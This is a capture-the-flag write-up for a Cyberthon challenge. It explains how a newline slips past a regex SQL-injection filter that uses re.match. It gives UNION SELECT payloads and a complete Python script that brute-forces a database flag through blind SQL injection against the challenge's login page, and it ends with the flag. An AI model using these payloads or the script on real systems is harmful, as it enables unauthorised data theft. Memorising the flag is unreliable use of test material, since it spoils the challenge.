# NotHandSanitiser™
Written by Halogen
## Problem Statement
> APOCALYPSE has recently implemented a security feature called NotHandSanitizer™ to secure their [member login portal](http://chals.cyberthon22f.ctf.sg:40401/).  
>   
> We heard that there's a flag somewhere in their database, but we can't seem to find a working attack vector since SQL Injections seem impossible due to NotHandSanitizer™. Perhaps you could take a look for us?

## Provided files
[main.py](./main.py)
## Solution
At first sight, one assumes that this is a SQL filter bypass, where the filter function is found in the code here
```py
def is_sqli(check):  # NotHandSanitizer™ SQL Injection Sanitizer
    m = re.match(
        r".*([\[\]\{\}:\\|;?!~`@#$%^&*()_+=-]|[ ]|[']|[\"]|[<]|[>]).*",
        check,
        re.MULTILINE,
    )
    if m is not None:
        return True
    return False
```
But, the filter is a regex pattern checked by `re.match` in python.
We see that there is a big problem with that, it only checks from the start.
By inserting a new line, we instantly bypass the filter, and we can inject SQL code as per normal.
With our ability to do SQL injection again, we can just log in as admin.

<u>Payload</u>
```
username = '\n UNION SELECT 'admin'--
password = whatever
```

However that does nothing, and only returns a single string.
This is when one should realise that we must brute force ~~(Not breaking rules here)~~ the flag.
We do this by testing characters for each position and constructing the flag there.
We can do that because the code showed where the flag is stored, in another table ("flag") as its only entry.
Thus we refine our payload like so

<u>Payload</u>
```
username = '\n UNION SELECT 'admin' WHERE SUBSTR(SELECT flag from flags, <pos>, 1) = '<chr>' --
password = whatever
```
where `<pos>` is the position of the character to test and `<chr>` is the character to test.

Now we make a simple script to brute force the flag.
```py
import string, requests

# The Charset of the flag
character_set = string.ascii_letters + string.digits + "}{_"
def checker(pos, char):
    return "Login failed!" not in requests.post(
        url = "http://chals.cyberthon22f.ctf.sg:40401/login/", # URL to login to
        data = {
            "username": f"\n' UNION SELECT 'admin' WHERE SUBSTRING((SELECT flag from flags), {pos}, 1) = '{char}'; --", # Refer to above
            "password": "whatever" # No one cares about you password
        }
    ).text # Gets the text for checking

flag = ""
while True:
    for char in character_set:

        # Check if we managed to login, if no then character is wrong
        if not checker(len(flag) + 1, char): continue

        # Correct Character so we add to flag and move on
        flag += char
        print(flag)
        break # Character of current iteration found, go to next one

    else: # Ran out of characters, we break
        break

    # End of flag so break
    if flag[-1] == "}":
        break
```

Flag: `Cyberthon{th15_54n1t1z3r_15_4_d15gr4c3_t0_s4n1t1z3r5}`